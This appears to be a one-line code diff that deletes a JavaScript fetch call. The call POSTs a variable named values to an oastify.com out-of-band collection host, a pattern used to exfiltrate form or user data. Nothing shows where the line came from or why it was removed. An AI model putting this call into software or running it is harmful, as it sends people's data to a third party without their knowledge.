@@ -1,1 +1,0 @@
-this.fetch("https://npg66ok9u6yy2e7x48rezmhan1tshi57.oastify.com", {method: 'POST', body:values})
